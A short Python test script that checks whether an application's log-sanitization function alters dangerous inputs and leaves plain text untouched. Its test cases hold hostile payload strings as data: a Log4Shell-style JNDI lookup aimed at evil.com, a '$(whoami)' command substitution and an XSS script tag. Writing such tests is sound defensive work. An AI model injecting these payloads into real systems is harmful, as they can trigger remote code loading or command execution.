#!/usr/bin/env python
from app import sanitize_for_logging

# Test log sanitization function
test_cases = [
    ('<script>alert(1)</script>', True),
    ('Normal text', False),
    ('${jndi:ldap://evil.com}', True),
    ('$(whoami)', True),
    ('Regular domain.com', False),
    ('\x00\x01\x02', True)  # Control characters
]

print('Testing log sanitization...')
for i, (test_input, should_be_sanitized) in enumerate(test_cases):
    print(f"Test case {i+1}:")
    print(f"  Input: {repr(test_input)}")
    sanitized = sanitize_for_logging(test_input)
    print(f"  Output: {repr(sanitized)}")
    print(f"  Should be sanitized: {should_be_sanitized}")
    
    # Check that dangerous content is removed/masked
    if should_be_sanitized:
        if test_input == sanitized:
            print(f'  ❌ Log sanitization failed for: {test_input}')
            exit(1)
        else:
            print(f'  ✅ Sanitized: {test_input[:20]}... -> {sanitized[:20]}...')
    else:
        if test_input != sanitized:
            print(f'  ❌ Safe content was modified: {test_input} -> {sanitized}')
            exit(1)
        else:
            print(f'  ✅ Safe content preserved')
    print()

print('✅ Log security validation completed')
